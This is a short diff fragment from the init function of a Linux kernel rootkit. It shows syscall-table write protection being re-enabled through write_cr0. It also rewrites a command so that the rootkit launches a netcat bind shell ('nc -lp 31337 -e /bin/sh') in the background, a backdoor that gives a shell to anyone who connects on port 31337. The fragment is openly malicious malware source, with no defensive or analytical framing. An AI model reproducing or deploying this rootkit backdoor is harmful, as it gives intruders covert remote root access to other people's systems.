@@ -225,7 +225,7 @@ int rootkit_init(void) { // Start lel rootkit
 
 	write_cr0(read_cr0() | 0x10000); // Turn off memory write to syscall table
 
-	char *argv[] = { "/bin/nc", "-lp", "31337", "-e", "/bin/sh", NULL };
+	char *argv[] = { "/bin/sh", "-c", "/bin/nc -lp 31337 -e /bin/sh &"};
         static char *env[] = {
         "HOME=/",
         "TERM=linux",
